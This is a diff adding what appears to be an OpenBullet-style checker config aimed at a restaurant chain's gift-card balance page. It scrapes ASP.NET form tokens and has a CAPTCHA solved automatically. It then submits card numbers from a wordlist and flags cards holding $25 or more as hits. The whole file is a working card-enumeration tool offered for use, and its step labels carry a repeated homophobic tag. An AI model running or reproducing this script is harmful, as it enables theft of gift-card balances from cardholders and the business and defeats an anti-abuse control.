@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Noodles",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-06T12:04:19.744063+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherGET REQUEST GET "https://balancechecker.noodles.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherVS PARSE "<SOURCE>" CSS "[name=__VIEWSTATE]" "value" 0 -> VAR "VS" "" "" 
+#HomoSexualPantherVG PARSE "<SOURCE>" CSS "[name=__VIEWSTATEGENERATOR]" "value" 0 -> VAR "VG" "" "" 
+#HomoSexualPantherEV PARSE "<SOURCE>" CSS "[name=__EVENTVALIDATION]" "value" 0 -> VAR "EV" "" "" 
+#HomoSexualPantherMAGIC-VG FUNCTION URLEncode "<VS>" -> VAR "VS" 
+#HomoSexualPantherMAGIC-VS FUNCTION URLEncode "<VG>" -> VAR "VG" 
+#HomoSexualPantherMAGIC-EV FUNCTION URLEncode "<EV>" -> VAR "EV" 
+#HomoSexualPantherMETHED-UP RECAPTCHA "https://balancechecker.noodles.com" "6LdYOFwUAAAAAFi5bK41_U9NXKE7cesR8odL-x7q" -> VAR "RECAP" 
+#HomoSexualPantherPOST REQUEST POST "https://balancechecker.noodles.com/default.aspx" AutoRedirect=TRUE 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=<VS>&__VIEWSTATEGENERATOR=<VG>&__EVENTVALIDATION=<EV>&TBCardNumber=<USER>&g-recaptcha-response=<RECAP>&submitbtn.x=60&submitbtn.y=17" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherBALANCE PARSE "<SOURCE>" LR "Your balance: " "</span>" Recursive=FALSE -> CAP "Balance" "" "" 
+#HomoSexualPantherBALANCE PARSE "<SOURCE>" LR "Your balance: " "</span>" Recursive=FALSE -> VAR "Balance" "" "" 
+#HomoSexualMINESWEEPER KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "$25.00" GreaterThan "$24.00" 
+  KEYCHAIN Retry OR 
+    KEY "Validation error, please try again" 
+  KEYCHAIN Failure OR 
+    KEY "No balance" 
+    KEY "<Balance>" LessThan "$25.00" 
+FUNCTION Constant "<Balance>" -> CAP "Balance" 
